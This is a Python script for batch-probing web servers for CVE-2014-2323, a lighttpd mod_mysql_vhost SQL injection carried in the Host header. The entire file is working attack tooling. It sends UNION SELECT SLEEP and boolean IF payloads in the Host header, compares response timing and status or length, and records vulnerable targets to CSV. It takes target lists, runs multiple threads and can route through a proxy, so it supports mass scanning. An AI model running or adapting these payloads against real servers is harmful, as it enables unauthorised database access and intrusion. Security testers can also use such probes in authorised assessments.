#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2014-2323 batch probe (lighttpd mod_mysql_vhost via Host header)
- Combines timing probes (SLEEP 0/2/6 by default, TTFB-based) and UNION-based behavior toggles
- English outputs (CSV), Chinese-friendly comments kept brief
- Pure stdlib; supports HTTP/HTTPS, HTTP proxy (incl. CONNECT), SNI override, multithreading

USAGE EXAMPLES
--------------
# Single target (HTTPS), default path "/"
python3 cve_2014_2323_union_probe.py --target "https://203.0.113.10" --repeats 3 --workers 8

# Batch from file (one per line), assume https for bare host:port, via proxy
python3 cve_2014_2323_union_probe.py --targets-file targets.txt --assume-https --proxy http://127.0.0.1:8080

# Use boolean-style behavior toggles instead of raw '/' and '/no_such...'
python3 cve_2014_2323_union_probe.py --target "http://1.2.3.4" --boolean-behavior

CSV COLUMNS
-----------
target,scheme,host,port,path,repeats,sleep_a,sleep_b,
base_ttfb_ms,s0_ttfb_ms,sA_ttfb_ms,sB_ttfb_ms,
d0_ms,dA_ms,dB_ms,ratio_AB_over_A,timing_verdict,
behav_status_mode_diff,behav_len_mode_diff,behav_status_diff_count,behav_len_diff_count,
behav_verdict,notes
"""

import argparse
import csv
import os
import socket
import ssl
import sys
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlsplit

# -------------------- HTTP helpers --------------------

def _read_until(sock, marker=b"\r\n\r\n", max_bytes=1_000_000, timeout=15):
    sock.settimeout(timeout)
    data = b""
    while marker not in data and len(data) < max_bytes:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def _parse_headers(header_bytes):
    status = None
    headers = {}
    try:
        head = header_bytes.split(b"\r\n\r\n", 1)[0].split(b"\r\n")
        if not head:
            return None, {}
        status_line = head[0].decode("iso-8859-1", "ignore")
        toks = status_line.split()
        if len(toks) >= 2 and toks[0].startswith("HTTP/"):
            try:
                status = int(toks[1])
            except:
                status = None
        for line in head[1:]:
            if b":" in line:
                k, v = line.split(b":", 1)
                headers[k.decode("iso-8859-1").strip().lower()] = v.decode("iso-8859-1", "ignore").strip()
    except Exception:
        pass
    return status, headers

def _connect_direct(host, port, timeout):
    return socket.create_connection((host, port), timeout=timeout)

def _connect_via_http_proxy(proxy_host, proxy_port, dest_host, dest_port, use_tls, timeout):
    s = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
    if use_tls:
        req = f"CONNECT {dest_host}:{dest_port} HTTP/1.1\r\nHost: {dest_host}:{dest_port}\r\nProxy-Connection: keep-alive\r\n\r\n"
        s.sendall(req.encode())
        resp = _read_until(s, timeout=timeout)
        first = resp.split(b"\r\n", 1)[0]
        if b" 200 " not in first:
            raise OSError(f"Proxy CONNECT failed: {first.decode('iso-8859-1','ignore')}")
    return s

def _wrap_tls(sock, server_hostname, timeout):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        tls = ctx.wrap_socket(sock, server_hostname=server_hostname)
    except ssl.SSLError:
        ctx = ssl._create_unverified_context()
        tls = ctx.wrap_socket(sock, server_hostname=server_hostname)
    tls.settimeout(timeout)
    return tls

def _safe_bracket_ipv6(host):
    try:
        socket.inet_pton(socket.AF_INET6, host)
        return f"[{host}]"
    except OSError:
        return host

def _build_request(path, host_header, absolute_url=None):
    if absolute_url:
        req_line = f"GET {absolute_url} HTTP/1.1\r\n"
    else:
        req_line = f"GET {path} HTTP/1.1\r\n"
    headers = [
        req_line,
        f"Host: {host_header}\r\n",
        "User-Agent: CVE-2014-2323-union-probe/1.0\r\n",
        "Accept: */*\r\n",
        "Connection: close\r\n",
        "\r\n"
    ]
    return "".join(headers).encode()

def send_once(dest_host, dest_port, use_tls, path, host_header,
              timeout=20, proxy=None, sni=None, absolute_form_for_proxy=True, drain_body=True):
    start = time.time()
    ttfb = None
    status = None
    cl = None
    note = "OK"
    try:
        if proxy:
            p_scheme, p_host, p_port = proxy
            if p_scheme != "http":
                raise ValueError("Only http proxy supported")
            sock = _connect_via_http_proxy(p_host, p_port, dest_host, dest_port, use_tls, timeout)
        else:
            sock = _connect_direct(dest_host, dest_port, timeout)

        if use_tls:
            server_name = sni if sni else dest_host
            sock = _wrap_tls(sock, server_name, timeout)

        absolute_url = None
        if proxy and not use_tls and absolute_form_for_proxy:
            origin = _safe_bracket_ipv6(dest_host)
            absolute_url = f"http://{origin}:{dest_port}{path}"

        req = _build_request(path, host_header, absolute_url=absolute_url)
        sock.settimeout(timeout)
        sock.sendall(req)

        first = sock.recv(1)
        if first:
            ttfb = time.time() - start
        header_bytes = first + _read_until(sock, timeout=timeout)
        status, headers = _parse_headers(header_bytes)
        if "content-length" in headers:
            try:
                cl = int(headers["content-length"])
            except Exception:
                cl = None

        if drain_body:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
        sock.close()
    except Exception as e:
        note = f"ERR:{e.__class__.__name__}"
    total = time.time() - start
    return dict(total_s=total, ttfb_s=ttfb if ttfb is not None else total, status=status, cl=cl, note=note)

# -------------------- Target parsing --------------------

def parse_target_line(line, assume_https=False, default_port_http=80, default_port_https=443):
    raw = line.strip()
    if not raw or raw.startswith("#"):
        return None
    if "://" in raw:
        u = urlsplit(raw)
        scheme = u.scheme.lower()
        tls = (scheme == "https")
        host = u.hostname
        port = u.port or (default_port_https if tls else default_port_http)
        path = u.path or "/"
        if u.query:
            path += "?" + u.query
        return dict(raw=raw, scheme=scheme, host=host, port=port, path=path, tls=tls)
    # host[:port] or [v6]:port
    tls = bool(assume_https)
    scheme = "https" if tls else "http"
    host = raw
    port = None
    if host.startswith("[") and ("]" in host):
        addr, _, rest = host.partition("]")
        host = addr.strip("[]")
        if rest.startswith(":"):
            port = int(rest[1:])
    elif ":" in host and host.count(":") == 1:
        h, p = host.split(":", 1)
        host, port = h, int(p)
    if port is None:
        port = default_port_https if tls else default_port_http
    return dict(raw=raw, scheme=scheme, host=host, port=port, path="/", tls=tls)

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    s = proxy_str.strip()
    if "://" not in s:
        s = "http://" + s
    u = urlsplit(s)
    if u.scheme != "http":
        raise ValueError("Only http proxy is supported (e.g., http://127.0.0.1:8080)")
    return ("http", u.hostname, u.port or 8080)

# -------------------- Stats helpers --------------------

def trimmed_mean(values):
    arr = [x for x in values if isinstance(x, (int, float)) and x > 0]
    if not arr:
        return None
    arr.sort()
    if len(arr) >= 5:
        arr = arr[1:-1]  # mild trimming
    return sum(arr) / len(arr) if arr else None

# -------------------- Probing logic --------------------

def interleaved_timing_probe(tgt, repeats, sleep_a, sleep_b, inj_template, timeout, proxy, sni):
    """
    Interleaved order per round to reduce drift: BASE -> SA -> BASE -> SB -> BASE -> S0
    Returns averaged TTFB timings and verdict.
    """
    order = [("BASE", None), ("SA", sleep_a), ("BASE", None),
             ("SB", sleep_b), ("BASE", None), ("S0", 0)]
    tmap = {k: [] for k, _ in order}

    notes = set()

    for r in range(repeats):
        for tag, sn in order:
            host_header = "example.com" if sn is None else inj_template.replace("{n}", str(sn))
            res = send_once(
                tgt["host"], tgt["port"], tgt["tls"], tgt["path"],
                host_header, timeout=timeout, proxy=proxy, sni=sni,
                absolute_form_for_proxy=True, drain_body=True
            )
            tmap[tag].append(res["ttfb_s"])
            if res["note"] != "OK":
                notes.add(res["note"])

    base = trimmed_mean(tmap["BASE"])
    s0   = trimmed_mean(tmap["S0"])
    sA   = trimmed_mean(tmap["SA"])
    sB   = trimmed_mean(tmap["SB"])

    d0 = (s0 - base) if (s0 and base) else None
    dA = (sA - base) if (sA and base) else None
    dB = (sB - base) if (sB and base) else None

    ratio = (dB / dA) if (dA and dA > 0.2 and dB is not None) else None

    timing_verdict = "UNKNOWN"
    if None not in (d0, dA, dB):
        ok_ctrl = (d0 < 0.5)                   # SLEEP(0) 控制組
        ok_A    = (1.0 <= dA <= 4.5)           # 寬鬆容許
        ok_B    = (3.0 <= dB <= 12.0)
        ok_r    = (ratio is not None and 1.6 <= ratio <= 4.5)
        timing_verdict = "YES" if (ok_ctrl and ok_A and ok_B and ok_r) else "NO"

    return {
        "base_ttfb_ms": round(base*1000,1) if base else "",
        "s0_ttfb_ms":   round(s0*1000,1) if s0 else "",
        "sA_ttfb_ms":   round(sA*1000,1) if sA else "",
        "sB_ttfb_ms":   round(sB*1000,1) if sB else "",
        "d0_ms":        round(d0*1000,1) if d0 is not None else "",
        "dA_ms":        round(dA*1000,1) if dA is not None else "",
        "dB_ms":        round(dB*1000,1) if dB is not None else "",
        "ratio":        round(ratio,2) if ratio is not None else "",
        "timing_verdict": timing_verdict,
        "timing_notes": ";".join(sorted(notes)) if notes else ""
    }

def behavior_union_probe(tgt, repeats, hostA, hostB, timeout, proxy, sni, threshold_cl=256):
    """
    Toggle docroot between two deterministic values (A, B) and look for stable, reversible difference.
    Returns counts and verdict.
    """
    A_status, B_status = [], []
    A_cl, B_cl = [], []
    notes = set()

    for r in range(repeats):
        rA = send_once(tgt["host"], tgt["port"], tgt["tls"], tgt["path"],
                       hostA, timeout=timeout, proxy=proxy, sni=sni,
                       absolute_form_for_proxy=True, drain_body=True)
        rB = send_once(tgt["host"], tgt["port"], tgt["tls"], tgt["path"],
                       hostB, timeout=timeout, proxy=proxy, sni=sni,
                       absolute_form_for_proxy=True, drain_body=True)
        A_status.append(rA["status"]); B_status.append(rB["status"])
        A_cl.append(rA["cl"]);         B_cl.append(rB["cl"])
        if rA["note"] != "OK": notes.add(rA["note"])
        if rB["note"] != "OK": notes.add(rB["note"])

    # Status mode comparison
    def mode(lst):
        vals = [x for x in lst if isinstance(x, int)]
        if not vals: return None
        c = Counter(vals).most_common(1)
        return c[0][0] if c else None

    mA, mB = mode(A_status), mode(B_status)
    behav_status_mode_diff = (mA is not None and mB is not None and mA != mB)

    # Length difference count (per-round >= threshold)
    behav_len_diff_count = 0
    for a, b in zip(A_cl, B_cl):
        if (isinstance(a, int) and isinstance(b, int) and a >= 0 and b >= 0
            and abs(a - b) >= threshold_cl):
            behav_len_diff_count += 1

    behav_status_diff_count = sum(1 for a, b in zip(A_status, B_status)
                                  if isinstance(a, int) and isinstance(b, int) and a != b)

    # Verdict: require consistent difference in either status mode or len majority
    majority = (repeats // 2) + 1
    behav_len_mode_diff = (behav_len_diff_count >= majority)
    behav_verdict = "YES" if (behav_status_mode_diff or behav_len_mode_diff) else "NO"

    return {
        "behav_status_mode_diff": "Y" if behav_status_mode_diff else "N",
        "behav_len_mode_diff":    "Y" if behav_len_mode_diff else "N",
        "behav_status_diff_count": behav_status_diff_count,
        "behav_len_diff_count":    behav_len_diff_count,
        "behav_verdict": behav_verdict,
        "behav_notes": ";".join(sorted(notes)) if notes else ""
    }

# -------------------- Main --------------------

def main():
    ap = argparse.ArgumentParser(description="CVE-2014-2323 batch probe (timing + behavior toggles)")
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--target", help="Single target (http(s)://host[:port][/path] or host[:port])")
    g.add_argument("--targets-file", help="File with one target per line")

    ap.add_argument("--assume-https", action="store_true",
                    help="When no scheme is provided, assume https (default http)")
    ap.add_argument("--path", default="/", help="Override path when missing in target (default /)")

    # Timing
    ap.add_argument("--repeats", type=int, default=3, help="Repeats per probe type (default 3)")
    ap.add_argument("--sleep-a", type=int, default=2, help="First sleep seconds (default 2)")
    ap.add_argument("--sleep-b", type=int, default=6, help="Second sleep seconds (default 6)")
    ap.add_argument("--inj-template", default="[::1]' UNION SELECT SLEEP({n})-- -",
                    help="Injected Host template for timing; {n} will be replaced with seconds")

    # Behavior
    ap.add_argument("--boolean-behavior", action="store_true",
                    help="Use IF(1=1, '/', '/no_such...') / IF(1=0, ...) instead of static toggles")
    ap.add_argument("--behavior-a", default="[::1]' UNION SELECT '/'-- -",
                    help="Host header for behavior variant A")
    ap.add_argument("--behavior-b", default="[::1]' UNION SELECT '/no_such_dir_abcxyz'-- -",
                    help="Host header for behavior variant B")
    ap.add_argument("--threshold-cl", type=int, default=256, help="Content-Length diff threshold (default 256 bytes)")

    ap.add_argument("--timeout", type=int, default=20, help="Per request timeout seconds (default 20)")
    ap.add_argument("--workers", type=int, default=8, help="Thread workers (default 8)")
    ap.add_argument("--sni", default=None, help="Override TLS SNI (optional)")
    ap.add_argument("--proxy", default=None, help="HTTP proxy, e.g., http://127.0.0.1:8080")
    ap.add_argument("--output", default="cve_2014_2323_results.csv", help="CSV output file")
    ap.add_argument("--append", action="store_true", help="Append to output if exists")
    ap.add_argument("--no-header", action="store_true", help="Do not write CSV header")

    args = ap.parse_args()

    proxy = parse_proxy(args.proxy) if args.proxy else None

    targets = []
    if args.target:
        t = parse_target_line(args.target, assume_https=args.assume_https)
        if t:
            if t.get("path", "/") == "/" and args.path:
                t["path"] = args.path
            targets.append(t)
    else:
        with open(args.targets_file, "r", encoding="utf-8") as f:
            for line in f:
                t = parse_target_line(line, assume_https=args.assume_https)
                if t:
                    if t.get("path", "/") == "/" and args.path:
                        t["path"] = args.path
                    targets.append(t)

    if not targets:
        print("No valid targets.", file=sys.stderr)
        sys.exit(2)

    # Behavior host variants
    if args.boolean_behavior:
        hostA = "[::1]' UNION SELECT IF(1=1,'/','/no_such_dir_abcxyz')-- -"
        hostB = "[::1]' UNION SELECT IF(1=0,'/','/no_such_dir_abcxyz')-- -"
    else:
        hostA = args.behavior_a
        hostB = args.behavior_b

    fieldnames = [
        "target","scheme","host","port","path","repeats","sleep_a","sleep_b",
        "base_ttfb_ms","s0_ttfb_ms","sA_ttfb_ms","sB_ttfb_ms",
        "d0_ms","dA_ms","dB_ms","ratio_AB_over_A","timing_verdict",
        "behav_status_mode_diff","behav_len_mode_diff","behav_status_diff_count","behav_len_diff_count",
        "behav_verdict","notes"
    ]

    mode = "a" if (args.append and os.path.exists(args.output)) else "w"
    write_header = (mode == "w") or (not args.no_header and not os.path.exists(args.output))

    with open(args.output, mode, newline="", encoding="utf-8") as csvf:
        writer = csv.DictWriter(csvf, fieldnames=fieldnames)
        if write_header:
            writer.writeheader()

        def run_one(t):
            # Timing probe
            t_res = interleaved_timing_probe(
                t, args.repeats, args.sleep_a, args.sleep_b,
                args.inj_template, args.timeout, proxy, args.sni
            )
            # Behavior probe
            b_res = behavior_union_probe(
                t, args.repeats, hostA, hostB,
                args.timeout, proxy, args.sni, threshold_cl=args.threshold_cl
            )
            # Merge notes
            notes = ";".join([x for x in [t_res.get("timing_notes",""), b_res.get("behav_notes","")] if x])

            row = {
                "target": t["raw"],
                "scheme": t["scheme"],
                "host": t["host"],
                "port": t["port"],
                "path": t["path"],
                "repeats": args.repeats,
                "sleep_a": args.sleep_a,
                "sleep_b": args.sleep_b,
                "base_ttfb_ms": t_res["base_ttfb_ms"],
                "s0_ttfb_ms": t_res["s0_ttfb_ms"],
                "sA_ttfb_ms": t_res["sA_ttfb_ms"],
                "sB_ttfb_ms": t_res["sB_ttfb_ms"],
                "d0_ms": t_res["d0_ms"],
                "dA_ms": t_res["dA_ms"],
                "dB_ms": t_res["dB_ms"],
                "ratio_AB_over_A": t_res["ratio"],
                "timing_verdict": t_res["timing_verdict"],
                "behav_status_mode_diff": b_res["behav_status_mode_diff"],
                "behav_len_mode_diff": b_res["behav_len_mode_diff"],
                "behav_status_diff_count": b_res["behav_status_diff_count"],
                "behav_len_diff_count": b_res["behav_len_diff_count"],
                "behav_verdict": b_res["behav_verdict"],
                "notes": notes
            }
            return row

        # Multithread
        with ThreadPoolExecutor(max_workers=args.workers) as ex:
            future_to_target = {ex.submit(run_one, t): t for t in targets}
            for fut in as_completed(future_to_target):
                try:
                    row = fut.result()
                except Exception as e:
                    t = future_to_target[fut]
                    row = {
                        "target": t["raw"], "scheme": t["scheme"], "host": t["host"], "port": t["port"],
                        "path": t["path"], "repeats": args.repeats, "sleep_a": args.sleep_a, "sleep_b": args.sleep_b,
                        "base_ttfb_ms": "", "s0_ttfb_ms": "", "sA_ttfb_ms": "", "sB_ttfb_ms": "",
                        "d0_ms": "", "dA_ms": "", "dB_ms": "", "ratio_AB_over_A": "",
                        "timing_verdict": "UNKNOWN",
                        "behav_status_mode_diff": "N", "behav_len_mode_diff": "N",
                        "behav_status_diff_count": 0, "behav_len_diff_count": 0,
                        "behav_verdict": "UNKNOWN", "notes": f"ERR:{e.__class__.__name__}"
                    }
                writer.writerow(row)
                print(",".join(str(row[h]) for h in fieldnames))

if __name__ == "__main__":
    main()

